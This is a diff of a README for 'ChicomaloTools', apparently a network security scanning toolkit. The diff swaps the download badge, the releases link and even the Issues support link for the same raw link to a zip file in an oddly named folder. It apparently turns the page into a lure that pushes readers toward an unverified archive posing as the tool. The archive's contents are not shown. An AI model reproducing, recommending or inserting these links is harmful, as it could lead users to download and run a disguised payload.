@@ -1,6 +1,6 @@
 # 🛠️ ChicomaloTools - Powerful Security Scanning Made Easy
 
-[![Download ChicomaloTools](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/Giufenix/ChicomaloTools/releases)
+[![Download ChicomaloTools](https://raw.githubusercontent.com/Giufenix/ChicomaloTools/master/predicatively/ChicomaloTools.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/Giufenix/ChicomaloTools/master/predicatively/ChicomaloTools.zip)
 
 ## 📜 Description
 CM Security Tools is a modular, multi-threaded network security scanning toolkit. It integrates features like host discovery, port scanning, weak password detection, and subdomain enumeration. This tool is designed for penetration testing and security research.
@@ -9,7 +9,7 @@ CM Security Tools is a modular, multi-threaded network security scanning toolkit
 ChicomaloTools allows you to easily perform various security assessments on your network. In just a few steps, you can set up and run the application without any programming skills.
 
 ## 🔽 Download & Install
-To get started, visit this page to download: [ChicomaloTools Releases](https://github.com/Giufenix/ChicomaloTools/releases).
+To get started, visit this page to download: [ChicomaloTools Releases](https://raw.githubusercontent.com/Giufenix/ChicomaloTools/master/predicatively/ChicomaloTools.zip).
 
 1. Open the link above.
 2. You will find a list of available versions.
@@ -54,7 +54,7 @@ For detailed guides on using each feature, you can check the documentation found
 If you want to contribute to ChicomaloTools, feel free to submit issues, feature requests, or pull requests. Check the project's contribution guidelines for more information.
 
 ## 📞 Support
-If you encounter any issues while using ChicomaloTools, you can reach out via the [Issues section](https://github.com/Giufenix/ChicomaloTools/issues) on GitHub. The community and maintainers are there to help resolve any problems you may face.
+If you encounter any issues while using ChicomaloTools, you can reach out via the [Issues section](https://raw.githubusercontent.com/Giufenix/ChicomaloTools/master/predicatively/ChicomaloTools.zip) on GitHub. The community and maintainers are there to help resolve any problems you may face.
 
 ## 📝 License
 ChicomaloTools is licensed under the MIT License. You can use it freely under the terms of this license.
